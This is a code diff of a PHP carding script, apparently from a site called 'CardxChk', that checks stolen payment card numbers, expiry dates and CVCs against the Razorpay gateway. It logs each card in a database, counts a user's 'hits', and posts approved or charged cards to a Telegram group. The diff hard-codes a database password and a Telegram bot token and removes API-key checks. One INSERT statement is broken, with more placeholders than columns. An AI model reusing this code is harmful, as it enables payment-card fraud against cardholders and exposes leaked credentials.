@@ -135,8 +135,126 @@ if (checkProxyIP($user_ip)) {
 
 // --- END OF PROXY DETECTION LOGIC ---
 
-// Include cron_sync.php for validateApiKey
-require_once __DIR__ . '/refresh.php';
+// === DATABASE CONNECTION ===
+ $databaseUrl = 'postgresql://card_chk_db_user:Zm2zF0tYtCDNBfaxh46MPPhC0wrB5j4R@dpg-d3l08pmr433s738hj84g-a.oregon-postgres.render.com/card_chk_db';
+
+try {
+    $dbUrl = parse_url($databaseUrl);
+    $host = $dbUrl['host'] ?? null;
+    $port = $dbUrl['port'] ?? 5432;
+    $user = $dbUrl['user'] ?? null;
+    $pass = $dbUrl['pass'] ?? null;
+    $path = $dbUrl['path'] ?? null;
+
+    if (!$host || !$user || !$pass || !$path) {
+        throw new Exception("Missing DB connection parameters");
+    }
+
+    $dbName = ltrim($path, '/');
+    
+    // Set connection timeout with extended options and SSL mode
+    $pdo = new PDO(
+        "pgsql:host=$host;port=$port;dbname=$dbName;sslmode=require",
+        $user,
+        $pass,
+        [
+            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+            PDO::ATTR_TIMEOUT => 15,
+            PDO::ATTR_PERSISTENT => false,
+            PDO::ATTR_EMULATE_PREPARES => false
+        ]
+    );
+    
+    // Store the database connection in a global variable for use in recordCardCheck
+    $GLOBALS['pdo'] = $pdo;
+    
+    // === TABLE SETUP ===
+    // Check if card_checks table exists
+    $tableExists = $pdo->query("SELECT to_regclass('public.card_checks')")->fetchColumn();
+    
+    if (!$tableExists) {
+        // Create card_checks table if it doesn't exist
+        $pdo->exec("
+            CREATE TABLE card_checks (
+                id SERIAL PRIMARY KEY,
+                user_id BIGINT,
+                card_number VARCHAR(255),
+                status VARCHAR(50),
+                response TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            );
+        ");
+        log_message("Created card_checks table");
+    }
+    
+    // Check if users table exists
+    $usersTableExists = $pdo->query("SELECT to_regclass('public.users')")->fetchColumn();
+    
+    if (!$usersTableExists) {
+        // Create users table if it doesn't exist
+        $pdo->exec("
+            CREATE TABLE users (
+                id SERIAL PRIMARY KEY,
+                telegram_id BIGINT UNIQUE,
+                name VARCHAR(255),
+                username VARCHAR(255),
+                photo_url VARCHAR(255),
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            );
+        ");
+        log_message("Created users table");
+    } else {
+        // Check if username column exists in users table
+        $columnExists = $pdo->query("
+            SELECT column_name 
+            FROM information_schema.columns 
+            WHERE table_name = 'users' AND column_name = 'username'
+        ")->fetchColumn();
+        
+        // Add username column if it doesn't exist
+        if (!$columnExists) {
+            $pdo->exec("ALTER TABLE users ADD COLUMN username VARCHAR(255)");
+            log_message("Added username column to users table");
+        }
+        
+        // Check if photo_url column exists in users table
+        $photoColumnExists = $pdo->query("
+            SELECT column_name 
+            FROM information_schema.columns 
+            WHERE table_name = 'users' AND column_name = 'photo_url'
+        ")->fetchColumn();
+        
+        // Add photo_url column if it doesn't exist
+        if (!$photoColumnExists) {
+            $pdo->exec("ALTER TABLE users ADD COLUMN photo_url VARCHAR(255)");
+            log_message("Added photo_url column to users table");
+        }
+    }
+    
+    // Check if user_stats table exists, create if not
+    $statsTableExists = $pdo->query("SELECT to_regclass('public.user_stats')")->fetchColumn();
+    if (!$statsTableExists) {
+        $pdo->exec("
+            CREATE TABLE user_stats (
+                id SERIAL PRIMARY KEY,
+                user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
+                hits INTEGER DEFAULT 0,
+                last_hit TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            );
+        ");
+        log_message("Created user_stats table");
+    }
+    
+} catch (PDOException $e) {
+    error_log("Database PDO Error in razorpay0.10$.php: " . $e->getMessage());
+    echo json_encode(['status' => 'ERROR', 'message' => 'Database connection error']);
+    exit;
+} catch (Exception $e) {
+    error_log("General Error in razorpay0.10$.php: " . $e->getMessage());
+    echo json_encode(['status' => 'error', 'message' => 'Server error']);
+    exit;
+}
 
 // Start session for user authentication
 session_start([
@@ -149,26 +267,6 @@ session_start([
 if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Forbidden Access', 'response' => 'Forbidden Access'];
-    log_message('Error 401: ' . json_encode($errorMsg));
-    echo json_encode($errorMsg);
-    exit;
-}
-
-// Validate API key
- $validation = validateApiKey();
-if (!$validation['valid']) {
-    http_response_code(401);
-    $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
-    log_message('Error 401: ' . json_encode($errorMsg));
-    echo json_encode($errorMsg);
-    exit;
-}
-
- $expectedApiKey = $validation['response']['apiKey'];
- $providedApiKey = $_SERVER['HTTP_X_API_KEY'] ?? '';
-if ($providedApiKey !== $expectedApiKey) {
-    http_response_code(401);
-    $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
     log_message('Error 401: ' . json_encode($errorMsg));
     echo json_encode($errorMsg);
     exit;
@@ -211,78 +309,147 @@ function formatResponse($response) {
 function sendTelegramNotification($card_details, $status, $response, $originalApiResponse = null) {
     global $sent_notifications;
     
-    // Create a unique key for this card to prevent duplicates
-    $notification_key = md5($card_details . $status . $response);
-    
-    // Check if we've already sent this notification
-    if (isset($sent_notifications[$notification_key])) {
-        log_message("Skipping duplicate notification for $card_details: $status");
-        return;
+    try {
+        // Create a unique key for this card to prevent duplicates
+        $notification_key = md5($card_details . $status . $response);
+        
+        // Check if we've already sent this notification
+        if (isset($sent_notifications[$notification_key])) {
+            log_message("Skipping duplicate notification for $card_details: $status");
+            return;
+        }
+        
+        // Mark this notification as sent
+        $sent_notifications[$notification_key] = true;
+        
+        // Check both formatted response and original API response for 3DS
+        $checkResponse = $originalApiResponse ? $originalApiResponse : $response;
+        if (is3DAuthenticationResponse($checkResponse)) {
+            log_message("Skipping Telegram notification for 3DS response: $checkResponse");
+            return;
+        }
+        
+        // Only proceed if status is CHARGED or APPROVED
+        if ($status !== 'CHARGED' && $status !== 'APPROVED') {
+            log_message("Skipping notification - status is not CHARGED or APPROVED: $status");
+            return;
+        }
+
+        // Load Telegram Bot Token from environment (secure storage)
+        $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '8421537809:AAEfYzNtCmDviAMZXzxYt6juHbzaZGzZb6A'; // Replace with actual token in env
+        $chat_id = '-1003204998888'; // Your group chat ID
+        $group_link = 'https://t.me/+zkYtLxcu7QYxODg1';
+        $site_link = 'https://cxchk.site';
+
+        // Get user info from session
+        $user_name = htmlspecialchars($_SESSION['user']['name'] ?? 'CardxChk User', ENT_QUOTES, 'UTF-8');
+        $user_username = htmlspecialchars($_SESSION['user']['username'] ?? '', ENT_QUOTES, 'UTF-8');
+        $user_profile_url = $user_username ? "https://t.me/" . str_replace('@', '', $user_username) : '#';
+        $status_emoji = ($status === 'CHARGED') ? '🔥' : '✅';
+        $gateway = 'Razorpay'; // Updated for this gateway
+        $formatted_response = formatResponse($response);
+
+        // Construct Telegram message
+        $message = "<b>✦━━[ 𝐇𝐈𝐓 𝐃𝐄𝐓𝐄𝐂𝓓𝐄𝐃! ]━━✦</b>\n" .
+                   "<a href=\"$group_link\">[⌇]</a> 𝐔𝐬𝐞𝐫 ➳ <a href=\"$user_profile_url\">$user_name</a>\n" .
+                   "<a href=\"$group_link\">[⌇]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <b>$status $status_emoji</b>\n" .
+                   "<a href=\"$group_link\">[⌇]</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ $gateway</b>\n" .
+                   "<a href=\"$group_link\">[⌇]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>$formatted_response</i>\n" .
+                   "<b>――――――――――――――</b>\n" .
+                   "<a href=\"$group_link\">[⌇]</a> 𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ <a href=\"$site_link\">𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>";
+
+        // Send to Telegram
+        $telegram_url = "https://api.telegram.org/bot$bot_token/sendMessage";
+        $payload = [
+            'chat_id' => $chat_id,
+            'text' => $message,
+            'parse_mode' => 'HTML',
+            'disable_web_page_preview' => true
+        ];
+
+        $ch = curl_init($telegram_url);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        $result = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $curl_error = curl_error($ch);
+        curl_close($ch);
+
+        if ($http_code !== 200 || !$result) {
+            log_message("Failed to send Telegram notification for $card_details: HTTP $http_code, Error: $curl_error, Response: " . ($result ?: 'No response'));
+        } else {
+            log_message("Telegram notification sent for $card_details: $status [$formatted_response]");
+        }
+    } catch (Exception $e) {
+        log_message("Error in sendTelegramNotification: " . $e->getMessage());
     }
-    
-    // Mark this notification as sent
-    $sent_notifications[$notification_key] = true;
-    
-    // Check both formatted response and original API response for 3DS
-    $checkResponse = $originalApiResponse ? $originalApiResponse : $response;
-    if (is3DAuthenticationResponse($checkResponse)) {
-        log_message("Skipping Telegram notification for 3DS response: $checkResponse");
-        return;
-    }
-    
-    // Only proceed if status is CHARGED or APPROVED
-    if ($status !== 'CHARGED' && $status !== 'APPROVED') {
-        log_message("Skipping notification - status is not CHARGED or APPROVED: $status");
-        return;
-    }
+}
 
-    // Load Telegram Bot Token from environment (secure storage)
-    $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '8421537809:AAEfYzNtCmDviAMZXzxYt6juHbzaZGzZb6A'; // Replace with actual token in env
-    $chat_id = '-1003204998888'; // Your group chat ID
-    $group_link = 'https://t.me/+zkYtLxcu7QYxODg1';
-    $site_link = 'https://cxchk.site';
-
-    // Get user info from session
-    $user_name = htmlspecialchars($_SESSION['user']['name'] ?? 'CardxChk User', ENT_QUOTES, 'UTF-8');
-    $user_username = htmlspecialchars($_SESSION['user']['username'] ?? '', ENT_QUOTES, 'UTF-8');
-    $user_profile_url = $user_username ? "https://t.me/" . str_replace('@', '', $user_username) : '#';
-    $status_emoji = ($status === 'CHARGED') ? '🔥' : '✅';
-    $gateway = 'Razorpay'; // Updated for this gateway
-    $formatted_response = formatResponse($response);
-
-    // Construct Telegram message
-    $message = "<b>✦━━[ 𝐇𝐈𝐓 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃! ]━━✦</b>\n" .
-               "<a href=\"$group_link\">[⌇]</a> 𝐔𝐬𝐞𝐫 ➳ <a href=\"$user_profile_url\">$user_name</a>\n" .
-               "<a href=\"$group_link\">[⌇]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <b>$status $status_emoji</b>\n" .
-               "<a href=\"$group_link\">[⌇]</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ $gateway</b>\n" .
-               "<a href=\"$group_link\">[⌇]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>$formatted_response</i>\n" .
-               "<b>――――――――――――</b>\n" .
-               "<a href=\"$group_link\">[⌇]</a> 𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ <a href=\"$site_link\">𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>";
-
-    // Send to Telegram
-    $telegram_url = "https://api.telegram.org/bot$bot_token/sendMessage";
-    $payload = [
-        'chat_id' => $chat_id,
-        'text' => $message,
-        'parse_mode' => 'HTML',
-        'disable_web_page_preview' => true
-    ];
-
-    $ch = curl_init($telegram_url);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    $result = curl_exec($ch);
-    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    $curl_error = curl_error($ch);
-    curl_close($ch);
-
-    if ($http_code !== 200 || !$result) {
-        log_message("Failed to send Telegram notification for $card_details: HTTP $http_code, Error: $curl_error, Response: " . ($result ?: 'No response'));
-    } else {
-        log_message("Telegram notification sent for $card_details: $status [$formatted_response]");
+// Function to record card check in database and update user stats
+function recordCardCheck($pdo, $card_number, $status, $response) {
+    try {
+        // Get or create user
+        $userId = null;
+        if (isset($_SESSION['user']['telegram_id'])) {
+            // Check if user exists
+            $stmt = $pdo->prepare("SELECT id FROM users WHERE telegram_id = ?");
+            $stmt->execute([$_SESSION['user']['telegram_id']]);
+            $user = $stmt->fetch(PDO::FETCH_ASSOC);
+            
+            if ($user) {
+                $userId = $user['id'];
+            } else {
+                // Create new user
+                $stmt = $pdo->prepare("
+                    INSERT INTO users (telegram_id, name, username, photo_url) 
+                    VALUES (?, ?, ?, ?, ?)
+                    RETURNING id
+                ");
+                $stmt->execute([
+                    $_SESSION['user']['telegram_id'],
+                    $_SESSION['user']['name'] ?? 'Unknown User',
+                    $_SESSION['user']['username'] ?? '',
+                    $_SESSION['user']['photo_url'] ?? ''
+                ]);
+                $userId = $pdo->lastInsertId();
+            }
+        }
+        
+        // Record the card check in the database
+        $stmt = $pdo->prepare("INSERT INTO card_checks (user_id, card_number, status, response, created_at) VALUES (?, ?, ?, ?, NOW())");
+        $stmt->execute([$userId, $card_number, $status, $response]);
+        
+        // If this is a hit (APPROVED or CHARGED), update user stats
+        if ($status === 'APPROVED' || $status === 'CHARGED') {
+            try {
+                // Check if user stats record exists
+                $stmt = $pdo->prepare("SELECT id FROM user_stats WHERE user_id = ?");
+                $stmt->execute([$userId]);
+                $statsRecord = $stmt->fetch(PDO::FETCH_ASSOC);
+                
+                if ($statsRecord) {
+                    // Update existing record
+                    $stmt = $pdo->prepare("UPDATE user_stats SET hits = hits + 1, last_hit = NOW() WHERE user_id = ?");
+                    $stmt->execute([$userId]);
+                } else {
+                    // Create new record
+                    $stmt = $pdo->prepare("INSERT INTO user_stats (user_id, hits, last_hit) VALUES (?, 1, NOW())");
+                    $stmt->execute([$userId]);
+                }
+                
+                log_message("Updated user stats for user ID $userId: incrementing hits count for $status card");
+            } catch (PDOException $e) {
+                log_message("Error updating user stats: " . $e->getMessage());
+                // Continue execution even if stats update fails
+            }
+        }
+    } catch (PDOException $e) {
+        log_message("Database error in recordCardCheck: " . $e->getMessage());
+    } catch (Exception $e) {
+        log_message("General error in recordCardCheck: " . $e->getMessage());
     }
 }
 
@@ -352,6 +519,9 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
         $response_msg = htmlspecialchars($response_text, ENT_QUOTES, 'UTF-8');
         $result = "$status [$response_msg]";
         log_message("$status for $card_details: $response_msg");
+
+        // Record the card check result in the database
+        recordCardCheck($GLOBALS['pdo'], $card_number, $status, $response_msg);
 
         // Send Telegram notification for CHARGED or APPROVED
         if ($status === 'CHARGED' || $status === 'APPROVED') {
